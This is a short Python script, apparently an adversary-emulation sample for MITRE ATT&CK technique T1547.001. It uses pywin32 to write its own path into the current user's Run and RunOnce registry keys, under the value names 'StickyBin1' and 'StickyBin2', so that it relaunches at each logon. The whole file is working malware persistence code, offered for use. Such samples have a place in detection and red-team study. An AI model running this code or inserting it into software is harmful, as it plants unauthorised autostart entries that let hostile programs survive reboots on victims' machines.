#!/usr/bin/env python3
## Author: lehag
## Code: T1547-001-SetRegistryPersistence.py
"""
	Description:
		It sets persistence in the windows registry.
"""
import win32api
import win32con
import sys

if __name__ == "__main__":
	print("[+] Setting persistence in the registry.");

	## Gets the program path.
	file_path = "\"" + win32api.GetFullPathName(sys.argv[0]) + "\"";

	## HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, win32con.KEY_SET_VALUE);
	win32api.RegSetValueEx(key, 'StickyBin1', 0, win32con.REG_SZ, file_path);
	win32api.RegCloseKey(key);

	## HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, win32con.KEY_SET_VALUE);
	win32api.RegSetValueEx(key, 'StickyBin2', 0, win32con.REG_SZ, file_path);
	win32api.RegCloseKey(key);
